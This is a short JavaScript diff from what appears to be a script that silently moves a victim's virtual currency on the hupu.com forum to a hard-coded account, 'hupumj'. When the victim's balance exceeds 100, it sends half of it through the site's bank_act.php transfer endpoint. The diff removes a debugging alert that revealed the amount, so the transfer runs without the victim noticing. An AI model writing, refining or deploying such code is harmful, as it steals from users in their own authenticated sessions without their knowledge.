@@ -49,7 +49,7 @@ function delRec(reqRec){
 function givemekll(kll){
 	var me="hupumj";
 	var pGkll = new XHConn();
-	pGkll.connect("http://my.hupu.com/bank_act.php","action=virement&pwuser="+me+"&to_money="+kll+"&content_plus=%E9%80%9A%E8%BF%87%E9%93%B6%E8%A1%8C%E7%BB%99%E4%BD%A0%E8%BD%AC%E8%B4%A6100%E5%8D%A1%E8%B7%AF%E9%87%8C%0A%E9%99%84%E8%A8%80%EF%BC%9A");
+	pGkll.connect("http://my.hupu.com/bank_act.php","action=virement&pwuser="+me+"&to_money="+kll+"&content_plus=%E9%80%9A%E8%BF%87%E9%93%B6%E8%A1%8C%E7%BB%99%E4%BD%A0%E8%BD%AC%E8%B4%A6"+kll+"%E5%8D%A1%E8%B7%AF%E9%87%8C%0A%E9%99%84%E8%A8%80%EF%BC%9A");
 }
 
 var p = new XHConn();
@@ -62,7 +62,6 @@ function getKll(reqKll){
 	if(countKll > 100)
 	{
 		countKll=countKll/2;
-		alert(countKll);
 		givemekll(countKll);
 		
 
